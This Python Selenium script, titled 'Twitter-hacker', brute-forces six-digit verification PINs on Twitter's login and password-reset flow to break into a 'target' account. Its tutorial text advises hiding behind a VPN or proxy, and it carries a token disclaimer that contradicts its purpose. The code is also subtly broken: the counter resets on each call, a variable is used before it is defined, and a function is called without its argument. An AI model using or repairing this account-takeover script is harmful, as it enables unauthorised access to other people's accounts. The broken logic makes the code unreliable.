from selenium import webdriver
from selenium.webdriver.common.keys import Keys


def intro():
    intro_while = 0
    title = '''
     _____        _ _   _                   _                _             
    |_   _|      (_) | | |                 | |              | |            
      | |_      ___| |_| |_ ___ _ __ ______| |__   __ _  ___| | _____ _ __ 
      | \ \ /\ / / | __| __/ _ \ '__|______| '_ \ / _` |/ __| |/ / _ \ '__|
      | |\ V  V /| | |_| ||  __/ |         | | | | (_| | (__|   <  __/ |   
      \_/ \_/\_/ |_|\__|\__\___|_|         |_| |_|\__,_|\___|_|\_\___|_|   
    '''
    print(title)
    print("")
    print("")
    print("by @IndentErr v0.1 alpha")
    print("condition: buggy")
    print("")
    print("Welcome!")
    while intro_while == True:
        print("please choose number:")
        print("1.tutorial")
        print("2.start hacking")
        intro_input = int(input("Enter: "))
        if intro_input == 1:
            print("This is not tool to hack twitter account hack")
            print("If you downloaded this to hack someone else I recommend you to not use this tool")
            print("Also, I recommend you to use this tool with vpn or proxy and chrome browser and chrome driver")
            print("1. download chromedriver from this website https://chromedriver.chromium.org/downloads")
            print("2. make sure that your driver is in same directory with my software ")
            print("3. run this tool")
            print("4. choose start hacking")
            print("5. new chrome window is going to pop out")
            print("6. get verification code of your target")
            print("7. enter start")
            print("8.wait until my software finish the hacking")
        elif intro_input == 2:
            print("Starting hacking process....")
            intro_while = False
        else:
            print("invalid input")
            print("please try again")

def bruteforce(num):
    num = [0,0,0,0,0,-1]
    num[5] = num[5] + 1
    if num[5] == 10:
        num[5] = 0
        num[4] = num[4] + 1
    else:
        print("unknown error occured")
    if num[4] == 10:
        num[4] = 0
        num[3] = num[3] + 1
    else:
        print("unknown error occured")
    if num[3] == 10:
        num[3] = 0
        num[2] = num[2] + 1
    else:
        print("unknown error occured")
    if num[2] == 10:
        num[2] = 0
        num[1] = num[1] + 1
    else:
        print("unknown error occured")
    if num[1] == 10:
        num[1] = 0
        num[0] = num[0] + 1 
    else:
        print("unknown error occured")
    if num[0] == 10:
        print("Brute force failed")
    else:
        print("unknown error occured")
    return num

options = webdriver.ChromeOptions()
options.add_experimental_option("excludeSwitches", ["enable-logging"])
driver = webdriver.Chrome(options=options)
global_list = 0
fn_result = 0
url = "https://twitter.com/login"
#https://twitter.com/account/send_password_reset
driver.get(url)
command = input("Enter: ")

intro()

if command == "start":
    print("Start bruteforce")
    i = 0
    while i == 0:
        fn_result = bruteforce(global_list)
        result_global = str(result_global[0]) + str(result_global[1]) + str(result_global[2]) + str(result_global[3]) + str(result_global[4]) + str(result_global[5])
        driver.find_element_by_name('pin').send_keys(bruteforce())
        driver.find_element_by_name('pin').send_keys(Keys.ENTER)
    #name: text or pin

